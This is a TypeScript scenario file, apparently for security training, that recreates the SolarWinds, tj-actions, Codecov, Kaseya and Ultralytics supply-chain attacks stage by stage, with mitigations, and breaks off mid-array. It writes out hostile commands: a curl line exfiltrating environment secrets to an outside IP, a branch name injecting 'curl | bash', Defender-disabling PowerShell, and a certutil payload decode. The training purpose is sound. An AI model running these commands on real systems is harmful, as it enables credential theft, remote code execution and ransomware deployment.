import { AttackScenario } from './types';

export const APT_BATCH6_SUPPLYCHAIN_CICD_SCENARIOS: AttackScenario[] = [
  {
    id: 'solarwinds-sunburst-orion-supply-chain',
    title: 'SolarWinds SUNSPOT Build Hijack & SUNBURST Backdoor (APT29)',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'APT29 (UNC2452 / Nobelium) compromises the SolarWinds Orion build server with SUNSPOT to swap InventoryManager.cs during MSBuild compilation, shipping the signed SUNBURST backdoor inside SolarWinds.BusinessLayerHost.exe.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'APT29 C2 (*.avsvmcloud.com)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'TeamCity / MSBuild Server', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Orion Server (BusinessLayerHost)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'EDR & DNS Security Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'AD Federation Services (SAML)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SUNSPOT Build-Time Source Injection into MSBuild',
        narration:
          'APT29 deploys SUNSPOT (taskhostsvc.exe) onto the SolarWinds Orion build server. SUNSPOT monitors running processes for MsBuild.exe and transiently replaces InventoryManager.cs with a backdoored version containing the SUNBURST OrionImprovementBusinessLayer class before restoring the clean source file.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'SUNSPOT Service: C:\\Windows\\Temp\\vmware-vmdmp.log (AES-encrypted build log)',
          'Target Process Poll: MsBuild.exe compiling SolarWinds.Orion.Core.BusinessLayer.csproj',
          'Transient File Swap: Replace InventoryManager.cs -> Compile SolarWinds.Orion.Core.BusinessLayer.dll -> Restore InventoryManager.cs',
        ],
        defenseMitigation:
          'Enforce hermetic, ephemeral build environments (SLSA Build L3) with hardware-backed code signing and post-compilation reproducible binary verification.',
        logs: [
          {
            id: 'sunspot-1',
            timestamp: '03:12:04.112',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            CommandLine: 'C:\\Windows\\System32\\taskhostsvc.exe (SUNSPOT build monitor)',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\taskhostsvc.exe | TargetFilename: C:\\Builds\\Orion\\Src\\Lib\\SolarWinds.Orion.Core.BusinessLayer\\BackgroundInventory\\InventoryManager.cs | Note: Source file overwritten during active MSBuild.exe execution',
            parsedFields: {
              Implant: 'SUNSPOT (taskhostsvc.exe)',
              TargetedBuildProcess: 'MsBuild.exe',
              ModifiedSourceFile: 'InventoryManager.cs',
              CompiledArtifact: 'SolarWinds.Orion.Core.BusinessLayer.dll',
            },
          },
        ],
        packets: [
          {
            id: 'sunspot-pkt-1',
            timestamp: '03:14:22.400',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.70',
            destIp: '10.20.4.15',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 4096,
            hexDump: '48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D 0A 53 6F 6C 61 72 57 69 6E 64 73 2E 4F 72 69 6F 6E 2E 43 6F 72 65 2E 42 75 73 69 6E 65 73 73 4C 61 79 65 72 2E 64 6C 6C',
            decodedString: 'Signed Hotfix Download: SolarWinds-Orion-Core-2020.2.1-HF1.msp (Authenticode Signed with Backdoored OrionImprovementBusinessLayer)',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon',
        narration:
          'Loaded inside SolarWinds.BusinessLayerHost.exe on customer networks, SUNBURST remains dormant for 12–14 days, hashes running processes and drivers using 64-bit FNV-1a plus XOR to check for EDR tools, and encodes the victim AD domain name into a CNAME DNS query to *.avsvmcloud.com.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Command and Control (T1568.002 - Domain Generation Algorithms)',
        technicalCommands: [
          'Host Process: C:\\Program Files (x86)\\SolarWinds\\Orion\\SolarWinds.BusinessLayerHost.exe',
          'Defense Check: FNV-1a 64-bit hash comparison against hardcoded EDR process/driver hashes',
          'DNS DGA Beacon: <encoded_guid_and_domain>.appsync-api.us-east-1.avsvmcloud.com',
        ],
        defenseMitigation:
          'Monitor passive DNS for high-entropy subdomains resolving to unexpected CNAME targets and block outbound internet access from network management servers.',
        logs: [
          {
            id: 'sunspot-2',
            timestamp: '03:18:45.809',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'SolarWinds.BusinessLayerHost.exe',
            raw: 'EventID: 22 | Image: C:\\Program Files (x86)\\SolarWinds\\Orion\\SolarWinds.BusinessLayerHost.exe | QueryName: 7sbvaem201253652b890.appsync-api.us-east-1.avsvmcloud.com | QueryResults: type: 5 (CNAME) -> 13.59.205.66',
            parsedFields: {
              ParentProcess: 'SolarWinds.BusinessLayerHost.exe',
              DgaQuery: '7sbvaem201253652b890.appsync-api.us-east-1.avsvmcloud.com',
              CnameRedirect: 'Stage 2 TEARDROP / Cobalt Strike C2',
              DormancyPeriod: '12-14 Days Elapsed',
            },
          },
        ],
        packets: [
          {
            id: 'sunspot-pkt-2',
            timestamp: '03:18:45.812',
            protocol: 'DNS',
            sourceIp: '10.20.4.15',
            destIp: '8.8.8.8',
            port: 53,
            flag: 'NONE',
            payloadSize: 128,
            hexDump: '37 73 62 76 61 65 6D 32 30 31 32 35 33 36 35 32 62 38 39 30 0B 61 70 70 73 79 6E 63 2D 61 70 69 09 75 73 2D 65 61 73 74 2D 31 0A 61 76 73 76 6D 63 6C 6F 75 64 03 63 6F 6D',
            decodedString: 'DNS Query A: 7sbvaem201253652b890.appsync-api.us-east-1.avsvmcloud.com -> CNAME custom C2',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft',
        narration:
          'When the C2 operator responds with a CNAME pointing to a dedicated server, SUNBURST switches to HTTPS mimicking Orion Improvement Program (OIP) JSON traffic, drops the memory-only TEARDROP loader via Image File Execution Options (IFEO), and steals the ADFS token-signing certificate.',
        activeNodes: ['attacker', 'target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.004 - Private Keys / Golden SAML)',
        technicalCommands: [
          'HTTP OIP Camouflage: POST /swip/upd/SolarWinds.CortexPlugin.Components.xml HTTP/1.1',
          'TEARDROP Loader: Reads fake JPEG header from grumbles.jpg and maps Cobalt Strike Beacon in RAM',
          'ADFS Key Extraction: Export EncryptedPFX blob from ADFS configuration database + DKM decryption key',
        ],
        defenseMitigation:
          'Store ADFS token-signing keys in hardware security modules (HSMs) and audit remote WMI/IFEO registry modifications across Tier-0 servers.',
        logs: [
          {
            id: 'sunspot-3',
            timestamp: '03:24:19.004',
            source: 'EDR',
            severity: 'critical',
            EventCode: 13,
            ProcessName: 'SolarWinds.BusinessLayerHost.exe',
            raw: 'Alert: IFEO Debugger Persistence & Memory-Only TEARDROP Loader | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\dllhost.exe\\Debugger | Follow-up: Remote WMI execution to ADFS Server extracting EncryptedPFX',
            parsedFields: {
              Stage2Implant: 'TEARDROP (Memory-Only Loader)',
              PersistenceMechanism: 'IFEO Debugger Injection',
              Tier0Target: 'ADFS Token-Signing Certificate (Golden SAML)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'github-actions-tj-actions-changed-files-cve-2025-30066',
    title: 'GitHub Actions tj-actions/changed-files Runner Memory Dump (CVE-2025-30066)',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'CVE-2025-30066',
    description:
      'Threat actors hijack version tags (v1–v45.0.7) of the tj-actions/changed-files GitHub Action to point to a malicious commit that executes memdump.py, scraping CI/CD secrets directly from the Runner.Worker process memory and printing double-base64 blobs into build logs.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Tag Repointing & Log Scraper', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'GitHub Action Tag (@v45 -> 0e58ed8)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Ubuntu GitHub Runner (Runner.Worker)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'StepSecurity Harden-Runner / Wiz Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Production AWS / NPM / GitHub Secrets', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Retroactive Git Tag Repointing to Malicious Commit 0e58ed8',
        narration:
          'Using a compromised Personal Access Token (PAT) cascaded from reviewdog/action-setup, the attacker force-updates mutable Git tags (v1 through v45.0.7) in tj-actions/changed-files to point to malicious commit 0e58ed8671d6b60d0890c21b07f8835ace038e67.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'git tag -f v45 0e58ed8671d6b60d0890c21b07f8835ace038e67 && git push origin --tags --force',
          'Downstream Trigger: uses: tj-actions/changed-files@v45',
        ],
        defenseMitigation:
          'Pin all third-party GitHub Actions to full 40-character immutable commit SHAs rather than mutable version tags (@v45) and enforce GitHub Actions repository allowlists.',
        logs: [
          {
            id: 'tj-1',
            timestamp: '08:41:10.220',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Audit Log | Action: git.push_force_tag | Repo: tj-actions/changed-files | TagsModified: v1..v45.0.7 | TargetCommit: 0e58ed8671d6b60d0890c21b07f8835ace038e67',
            parsedFields: {
              CompromisedAction: 'tj-actions/changed-files',
              HijackedTags: 'v1 through v45.0.7',
              MaliciousCommitSha: '0e58ed8671d6b60d0890c21b07f8835ace038e67',
              CveId: 'CVE-2025-30066',
            },
          },
        ],
        packets: [
          {
            id: 'tj-pkt-1',
            timestamp: '08:41:12.005',
            protocol: 'HTTPS',
            sourceIp: '140.82.112.10',
            destIp: '20.175.192.149',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 824,
            hexDump: '47 45 54 20 2F 74 6A 2D 61 63 74 69 6F 6E 73 2F 63 68 61 6E 67 65 64 2D 66 69 6C 65 73 2F 74 61 72 62 61 6C 6C 2F 76 34 35 20 48 54 54 50 2F 31 2E 31',
            decodedString: 'GET /tj-actions/changed-files/tarball/v45 HTTP/1.1 -> Resolves to commit 0e58ed8671d6b60d0890c21b07f8835ace038e67',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Sudo Python Execution of memdump.py Against /proc/$pid/mem',
        narration:
          'When a workflow runs the compromised action, the injected Node.js bundle decodes a Base64 wrapper that runs memdump.py as root via sudo python3, locating the Runner.Worker process ID and reading its readable virtual memory segments in /proc/$pid/maps and /proc/$pid/mem.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access (T1003.007 - Proc Filesystem)',
        technicalCommands: [
          'pgrep -f "Runner.Worker" -> PID 1842',
          'sudo python3 memdump.py 1842 (Scans /proc/1842/maps & /proc/1842/mem for regex patterns)',
        ],
        defenseMitigation:
          'Deploy runtime CI/CD security sensors (e.g., StepSecurity Harden-Runner or eBPF ptrace/procfs monitors) that block unauthorized reads of /proc/[pid]/mem.',
        logs: [
          {
            id: 'tj-2',
            timestamp: '08:41:18.540',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'python3',
            CommandLine: 'sudo python3 -c "import os,re,sys; ..." (memdump.py)',
            raw: 'Linux eBPF Runtime Alert | Process: /usr/bin/python3 (UID: 0) | Parent: /home/runner/externals/node20/bin/node | TargetFile: /proc/1842/mem (TargetProcess: Runner.Worker) | Action: Cross-process virtual memory scraping',
            parsedFields: {
              ExecutingProcess: 'sudo python3 (memdump.py)',
              TargetProcess: 'Runner.Worker (PID 1842)',
              AccessedArtifact: '/proc/1842/maps and /proc/1842/mem',
              MitreTechnique: 'T1003.007 (Proc Filesystem Memory Dump)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Double-Base64 Secret Exfiltration via Public Build Logs',
        narration:
          'To evade GitHub Actions automatic log redaction (which masks plaintext secrets), memdump.py double-Base64 encodes the harvested AWS keys, NPM tokens, and GITHUB_TOKEN values and prints them directly to stdout in the public workflow build log.',
        activeNodes: ['target', 'attacker', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1567 - Exfiltration Over Web Service)',
        technicalCommands: [
          'echo -n "$HARVESTED_SECRETS" | base64 -w 0 | base64 -w 0',
          'Attacker Scraper: Queries GitHub REST API /repos/{owner}/{repo}/actions/runs/{run_id}/logs',
        ],
        defenseMitigation:
          'Immediately rotate all secrets exposed to affected workflow runs, restrict GITHUB_TOKEN permissions to contents:read by default, and use short-lived OIDC tokens.',
        logs: [
          {
            id: 'tj-3',
            timestamp: '08:41:21.902',
            source: 'WAF',
            severity: 'critical',
            raw: 'Workflow Log Exfiltration Detected | Step: Run tj-actions/changed-files@v45 | Output: Vm0wd2QyUXlVWGxXYTJoV1YwZG9WVll3WkRSV1ZscHpXa2M1VjAxWGVEQmFWekZIVmpGYWMySkVUbGhoTWsweQo= (Double-Base64 Encoded Runner Secrets)',
            parsedFields: {
              ExfiltrationChannel: 'Public GitHub Actions Workflow stdout Log',
              Obfuscation: 'Double Base64 Encoding (Bypasses Secret Masking)',
              ExposedCredentials: 'AWS_SECRET_ACCESS_KEY, NPM_TOKEN, GITHUB_TOKEN',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'codecov-bash-uploader-ci-env-exfil',
    title: 'Codecov Bash Uploader CI/CD Environment Variable Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Attackers extract a Google Cloud Storage credential from Codecov’s Docker image build process and modify the hosted Bash Uploader script (codecov.sh) to silently POST all CI runner environment variables and git remote URLs to an external server.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Collector (178.62.86.114)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Codecov GCS Bucket (codecov.io/bash)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Enterprise CI Runner (curl | bash)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Egress Proxy & SHA-256 Verifier', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Private Git Repos & Cloud Production Keys', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader',
        narration:
          'Leveraging a leaked GCS service account key from a Docker image layer, the threat actor modifies line 522 of the hosted bash script at https://codecov.io/bash, appending a single-line curl payload.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'gsutil cp tampered-codecov.sh gs://codecov-bash-uploader/bash',
          'Injected Line: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true',
        ],
        defenseMitigation:
          'Never pipe remote scripts directly into a shell (`curl | bash`) without verifying cryptographic SHA-256 checksums or PGP signatures in CI pipelines.',
        logs: [
          {
            id: 'codecov-1',
            timestamp: '11:05:14.090',
            source: 'Auth',
            severity: 'critical',
            raw: 'GCS Object Overwrite | Bucket: codecov-bash-uploader | Object: bash | ExpectedSHA256: 325107... | ObservedSHA256: ac8165... | Note: Unverified modification of hosted CI uploader script',
            parsedFields: {
              ModifiedArtifact: 'https://codecov.io/bash',
              HashMismatch: 'Expected 325107... vs Observed ac8165...',
              RootCause: 'Leaked GCS credential in Docker image layer',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Unverified curl | bash Execution & CI Environment Harvesting',
        narration:
          'Thousands of customer CI/CD pipelines execute bash <(curl -s https://codecov.io/bash) at the end of unit test runs, causing the runner shell to evaluate $(git remote -v) and $(env) and transmit the output over HTTP.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Collection (T1005 - Data from Local System)',
        technicalCommands: [
          'bash <(curl -s https://codecov.io/bash)',
          'curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true',
        ],
        defenseMitigation:
          'Restrict outbound CI runner network egress to an explicit domain allowlist so arbitrary raw IP connections (such as 178.62.86.114) are blocked and logged.',
        logs: [
          {
            id: 'codecov-2',
            timestamp: '11:06:02.411',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'curl',
            CommandLine: 'curl -sm 0.5 -d "origin https://github.com/corp/payments.git (fetch)<<<<<< ENV AWS_SECRET_ACCESS_KEY=..." http://178.62.86.114/upload/v2',
            raw: 'CI Runner Process Telemetry | Parent: /bin/bash | Command: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 | DestinationIP: 178.62.86.114',
            parsedFields: {
              ParentScript: 'codecov.sh (Line 522)',
              HarvestedData: 'git remote -v + full process env table',
              ExfilDestination: 'http://178.62.86.114/upload/v2',
              TimeoutFlag: '-sm 0.5 (500ms silent fail-open)',
            },
          },
        ],
        packets: [
          {
            id: 'codecov-pkt-1',
            timestamp: '11:06:02.445',
            protocol: 'HTTP',
            sourceIp: '10.128.0.42',
            destIp: '178.62.86.114',
            port: 80,
            flag: 'PSH-ACK',
            payloadSize: 3420,
            hexDump: '50 4F 53 54 20 2F 75 70 6C 6F 61 64 2F 76 32 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 37 38 2E 36 32 2E 38 36 2E 31 31 34 0D 0A',
            decodedString: 'POST /upload/v2 HTTP/1.1 | Body: origin https://x-access-token:ghp_...@github.com/corp/core.git <<<<<< ENV AWS_ACCESS_KEY_ID=AKIA... GPG_PRIVATE_KEY=...',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse',
        narration:
          'Using the harvested GitHub tokens, GPG signing keys, and cloud credentials from the CI environment dump, the threat actor clones hundreds of private customer source repositories and pivots into production cloud accounts.',
        activeNodes: ['attacker', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement (T1078.004 - Cloud Accounts)',
        technicalCommands: [
          'git clone https://x-access-token:ghp_StolenCiToken@github.com/corp/core-platform.git',
        ],
        defenseMitigation:
          'Scope CI tokens to minimum repository permissions, avoid storing long-lived signing keys in global CI environment variables, and audit unexpected git clone events from non-runner ASNs.',
        logs: [
          {
            id: 'codecov-3',
            timestamp: '14:22:19.772',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Enterprise Audit | Action: git.clone | Actor: ci-bot-account | SourceIP: 104.248.94.23 (Non-Runner ASN) | Repository: corp/core-platform | Status: Success',
            parsedFields: {
              CompromisedIdentity: 'ci-bot-account (Harvested from CI env)',
              SourceIp: '104.248.94.23',
              Action: 'Unauthorized Private Repository Clone',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'kaseya-vsa-revil-cve-2021-30116',
    title: 'Kaseya VSA MSP Zero-Day & REvil MsMpEng.exe Side-Loading (CVE-2021-30116)',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'CVE-2021-30116',
    description:
      'REvil (Sodinokibi) exploits an authentication bypass and SQL injection chain (CVE-2021-30116) in on-premises Kaseya VSA servers via /dl.asp, pushing a fake "Kaseya VSA Agent Hot-fix" to MSP customer endpoints that side-loads REvil (mpsvc.dll) via a legitimate Microsoft Defender binary (MsMpEng.exe).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'REvil Affiliate Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'MSP Kaseya VSA Server (/dl.asp)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Managed Endpoint (AgentMon.exe)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Huntress MDR / Sysmon Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Downstream Customer File Shares', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Kaseya VSA /dl.asp Authentication Bypass & agent.crt Upload',
        narration:
          'The attacker sends crafted HTTP POST requests to /dl.asp on the exposed Kaseya VSA server, forging the session validation hash to bypass authentication (CVE-2021-30116), injecting SQL commands, and uploading a base64-encoded payload disguised as agent.crt.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'POST /dl.asp HTTP/1.1 (Forged sessionId validation bypass - CVE-2021-30116)',
          'Upload staged payload: C:\\Kaseya\\WebPages\\ManagedFiles\\VSATicketFiles\\agent.crt',
        ],
        defenseMitigation:
          'Never expose on-premises RMM management interfaces (Kaseya VSA) directly to the public internet without VPN/Zero-Trust access controls and apply DIVD/Kaseya security patches.',
        logs: [
          {
            id: 'kaseya-1',
            timestamp: '16:10:05.312',
            source: 'WAF',
            severity: 'critical',
            raw: 'IIS Access Log | POST /dl.asp - 443 - 198.51.100.88 Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; SV1; SE) 200 0 0 45 | UploadedFile: C:\\Kaseya\\WebPages\\ManagedFiles\\VSATicketFiles\\agent.crt',
            parsedFields: {
              VulnerableEndpoint: '/dl.asp',
              ExploitedCve: 'CVE-2021-30116 (Auth Bypass + SQLi)',
              StagedPayload: 'C:\\Kaseya\\WebPages\\ManagedFiles\\VSATicketFiles\\agent.crt',
              UserAgent: 'MSIE 9.0; Windows NT 6.1; SV1; SE',
            },
          },
        ],
        packets: [
          {
            id: 'kaseya-pkt-1',
            timestamp: '16:10:05.300',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.88',
            destIp: '203.0.113.55',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1460,
            hexDump: '50 4F 53 54 20 2F 64 6C 2E 61 73 70 20 48 54 54 50 2F 31 2E 31 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 35 2E 30',
            decodedString: 'POST /dl.asp HTTP/1.1 | Forged SessionId Auth Bypass + Upload agent.crt',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Kaseya Agent Procedure Disabling Defender & Decoding agent.exe',
        narration:
          'Abusing the trusted Kaseya VSA management channel, the attacker pushes a procedure named "Kaseya VSA Agent Hot-fix" to all managed endpoints. AgentMon.exe runs PowerShell to disable Windows Defender protections and uses certutil.exe -decode to unpack agent.crt into agent.exe.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1562.001 - Disable or Modify Tools)',
        technicalCommands: [
          'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true"',
          'C:\\Windows\\System32\\certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe',
        ],
        defenseMitigation:
          'Enforce Tamper Protection on endpoint security agents so local SYSTEM processes spawned by RMM agents cannot disable real-time protection via Set-MpPreference.',
        logs: [
          {
            id: 'kaseya-2',
            timestamp: '16:14:22.880',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cmd.exe',
            CommandLine: '"C:\\WINDOWS\\system32\\cmd.exe" /c ping 127.0.0.1 -n 4979 > nul & C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true ... & C:\\Windows\\System32\\certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe',
            raw: 'EventID: 1 | ParentImage: C:\\Program Files (x86)\\Kaseya\\KSA\\AgentMon.exe | Image: C:\\Windows\\System32\\cmd.exe | CommandLine: ... Set-MpPreference -DisableRealtimeMonitoring $true ... & certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe',
            parsedFields: {
              ParentProcess: 'AgentMon.exe (Trusted RMM Agent)',
              DefenseEvasion: 'Set-MpPreference -DisableRealtimeMonitoring $true',
              LolbinDecoder: 'certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: MsMpEng.exe DLL Side-Loading of REvil Ransomware (mpsvc.dll)',
        narration:
          'The unpacked agent.exe drops an older, legitimately signed Windows Defender executable (MsMpEng.exe) alongside a malicious REvil DLL named mpsvc.dll into C:\\Windows\\, executing MsMpEng.exe to side-load mpsvc.dll and encrypt all local and network files.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion & Impact (T1574.002 - DLL Side-Loading / T1486)',
        technicalCommands: [
          'Drop C:\\Windows\\MsMpEng.exe (Signed Microsoft binary) + C:\\Windows\\mpsvc.dll (REvil 2.05 payload)',
          'Execute C:\\Windows\\MsMpEng.exe -> Side-loads C:\\Windows\\mpsvc.dll in memory',
        ],
        defenseMitigation:
          'Alert on execution of MsMpEng.exe outside its canonical C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\ or C:\\Program Files\\Windows Defender\\ directories and verify DLL authenticode signatures.',
        logs: [
          {
            id: 'kaseya-3',
            timestamp: '16:14:29.104',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 7,
            ProcessName: 'MsMpEng.exe',
            raw: 'EventID: 7 (ImageLoaded) | Image: C:\\Windows\\MsMpEng.exe | ImageLoaded: C:\\Windows\\mpsvc.dll | Signed: true (Revoked/Mismatched Cert: PB03 TRANSPORT LTD) | Impact: REvil Ransomware Encryption Initiated',
            parsedFields: {
              HostBinary: 'C:\\Windows\\MsMpEng.exe (Anomalous Path)',
              SideLoadedDll: 'C:\\Windows\\mpsvc.dll',
              RansomwareFamily: 'REvil / Sodinokibi v2.05',
              MitreTechnique: 'T1574.002 (DLL Side-Loading)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'pypi-ultralytics-github-pwnrequest',
    title: 'Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Attackers exploit a GitHub Actions pull_request_target script injection vulnerability in the Ultralytics YOLO AI framework repository to hijack the automated release pipeline and publish backdoored PyPI wheels (v8.3.41/42/45/46) bundling an XMRig cryptominer.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Crafted PR Branch ($GITHUB_ENV Injection)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'GitHub Actions (pull_request_target)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PyPI Registry (ultralytics 8.3.41/45)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sigstore / PyPI Attestation Auditor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'AI Training Cluster / Colab GPU Nodes', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GitHub Actions pull_request_target Branch Name Command Injection',
        narration:
          'The attacker opens a pull request from a fork with a crafted branch name containing shell metacharacters. Because the repository workflow triggers on pull_request_target (which runs with write access and repository secrets) and interpolates ${{ github.head_ref }} directly into a run: shell block, arbitrary commands execute inside the privileged runner.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'Crafted Branch Name: fix";curl -sSfL https://gist.githubusercontent.com/.../inject.sh | bash;#',
          'Vulnerable Workflow: on: pull_request_target -> run: echo "Branch: ${{ github.head_ref }}"',
        ],
        defenseMitigation:
          'Never interpolate untrusted context expressions (${{ github.head_ref }}, ${{ github.event.pull_request.title }}) directly inside run: scripts; pass them via environment variables and avoid pull_request_target for untrusted code.',
        logs: [
          {
            id: 'ultra-1',
            timestamp: '01:15:40.219',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Actions Workflow Execution | Trigger: pull_request_target | Workflow: format.yml | InjectedHeadRef: fix";curl -sSfL .../inject.sh | bash;# | Permissions: write-all + PYPI_TOKEN access',
            parsedFields: {
              VulnerabilityClass: 'GitHub Actions PwnRequest / Template Injection',
              TriggerContext: 'pull_request_target',
              UnsanitizedVariable: '${{ github.head_ref }}',
              TargetedProject: 'ultralytics/ultralytics',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46',
        narration:
          'The injected payload poisons the build environment and steals the PyPI API token, publishing compromised versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 to PyPI with backdoored initialization code inside ultralytics/utils/downloads.py.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'Inject into ultralytics/utils/downloads.py: safe_download("https://github.com/.../rig.tar.gz")',
          'twine upload dist/ultralytics-8.3.45-py3-none-any.whl -u __token__ -p $PYPI_TOKEN',
        ],
        defenseMitigation:
          'Enforce PyPI Trusted Publishing (OIDC with environment protection rules and manual approval gates) and audit Sigstore provenance attestations for every published wheel.',
        logs: [
          {
            id: 'ultra-2',
            timestamp: '02:04:11.650',
            source: 'WAF',
            severity: 'critical',
            raw: 'PyPI Transparency & Provenance Alert | Package: ultralytics | Versions: 8.3.41, 8.3.42, 8.3.45, 8.3.46 | Anomaly: Wheel contents in ultralytics/utils/downloads.py diverge from tagged Git source commit; versions 8.3.45/46 uploaded without OIDC Sigstore attestation',
            parsedFields: {
              CompromisedPackage: 'ultralytics (PyPI)',
              AffectedVersions: '8.3.41, 8.3.42, 8.3.45, 8.3.46',
              ModifiedFile: 'ultralytics/utils/downloads.py',
              ProvenanceSignal: 'Missing Sigstore OIDC Attestation on 8.3.45/8.3.46',
            },
          },
